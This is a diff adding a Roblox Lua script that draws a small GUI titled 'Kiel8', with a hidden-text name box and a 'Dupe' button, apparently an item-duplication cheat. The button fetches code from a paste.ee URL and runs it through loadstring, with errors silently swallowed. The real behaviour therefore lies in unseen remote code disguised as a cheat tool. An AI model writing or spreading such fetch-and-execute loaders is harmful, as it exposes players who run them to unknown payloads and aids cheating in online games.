@@ -1,0 +1,57 @@
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "MyGui"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame")
+Frame.Name = "MainFrame"
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark background
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.5, -100, 0.5, -75)
+Frame.Size = UDim2.new(0, 200, 0, 150)
+
+local Label = Instance.new("TextLabel")
+Label.Name = "TitleLabel"
+Label.Parent = Frame
+Label.BackgroundTransparency = 1
+Label.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+Label.Text = "Kiel8"
+Label.TextSize = 14
+Label.Position = UDim2.new(0.5, -50, 0.1, 0)
+Label.Size = UDim2.new(1, 0, 0, 20)
+Label.Font = Enum.Font.SourceSans
+Label.TextScaled = true
+Label.TextWrapped = true
+
+local TextBox = Instance.new("TextBox")
+TextBox.Name = "NameTextBox"
+TextBox.Parent = Frame
+TextBox.BackgroundTransparency = 0.2
+TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0, 0) -- Invisible text
+TextBox.PlaceholderText = "Put the names here..."
+TextBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0, 0) -- Invisible placeholder
+TextBox.Position = UDim2.new(0.1, 0, 0.3, 0)
+TextBox.Size = UDim2.new(0.8, 0, 0, 30)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.TextScaled = true
+TextBox.TextWrapped = true
+
+local Button = Instance.new("TextButton")
+Button.Name = "MyButton"
+Button.Parent = Frame
+Button.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+Button.BorderSizePixel = 0
+Button.Position = UDim2.new(0.1, 0, 0.7, 0)
+Button.Size = UDim2.new(0.8, 0, 0, 30)
+Button.Text = "Dupe"
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+Button.Font = Enum.Font.SourceSans
+Button.TextScaled = true
+Button.TextWrapped = true
+
+Button.MouseButton1Click:Connect(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://paste.ee/r/g9fEn8El"))()
+    end)
+end)
